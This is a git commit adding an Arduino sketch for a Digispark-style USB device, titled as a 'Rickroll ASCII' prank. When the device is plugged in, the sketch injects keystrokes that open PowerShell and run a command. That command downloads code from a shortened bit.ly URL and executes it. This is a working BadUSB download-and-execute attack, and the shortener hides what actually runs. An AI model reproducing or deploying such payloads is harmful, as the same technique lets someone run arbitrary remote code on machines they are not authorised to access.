7d352b38e723de61292c0f48a219047497b28ae3
João Eduardo || Aph0ph1s <129476953+C1berBot13@users.noreply.github.com>
2024-03-24 23:24:18 -0300

    Rickroll ASCII

---
+++ Scripts/Rickroll ASCII/rickroll.ino
@@ -0,0 +1,20 @@
+
+#include "DigiKeyboardPtBr.h"
+
+void setup(){
+  //empity
+}
+
+void loop(){
+
+  DigiKeyboardPtBr.sendKeyStroke(0);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboardPtBr.delay(1000);
+  DigiKeyboardPtBr.print("powershell");
+  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
+  DigiKeyboardPtBr.delay(200);
+  DigiKeyboardPtBr.print("iex (New-Object Net.WebClient).DownloadString('http://bit.ly/e0Mw9w')");
+  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
+
+  for (;;){/*empty*/}
+}
